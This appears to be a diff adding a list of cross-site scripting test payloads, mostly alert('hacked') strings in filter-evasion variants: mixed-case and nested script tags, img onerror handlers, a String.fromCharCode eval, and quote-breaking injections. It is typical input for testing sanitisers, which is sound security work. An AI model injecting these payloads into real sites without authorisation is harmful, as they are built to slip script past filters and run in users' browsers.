@@ -1,0 +1,23 @@
+<script>alert("hacked")</script>
+<s   c   r   i   p   t>alert("hacked")</   s   c   r   i   p   t>
+<Script>alert("hacked")</Script>
+<scrIpt>alert("hacked")</scrIpt>
+<scRipt>alert("hacked")</scripT>
+<SCRIPT>alert("hacked")</SCRIPT>
+<scr<script>ipt>alert("hacked")</script>
+<scr<script>ipt>alert("hacked")</scr</script>ipt>
+<<script>script>alert("hacked")</script</script>>
+<img src /onerror=alert("hacked")>
+<img src='sampleimage' onerror="alert('hacked')" />
+<img src='nonexistant' onerror="alert('hacked')" />
+<img src /onerror=alert(1)>
+<script>prompt("hacked")</script>
+<script>eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 39, 120, 115, 115, 39, 41))</script>
+abc";alert("hacked");
+abc";alert("hacked"); //
+abc';alert('hacked');
+abc';alert('hacked'); //
+";alert('hacked');"
+';alert('hacked');'
+"><script>alert('hacked')</script>
+#evul<script>alert('hacked')</script>
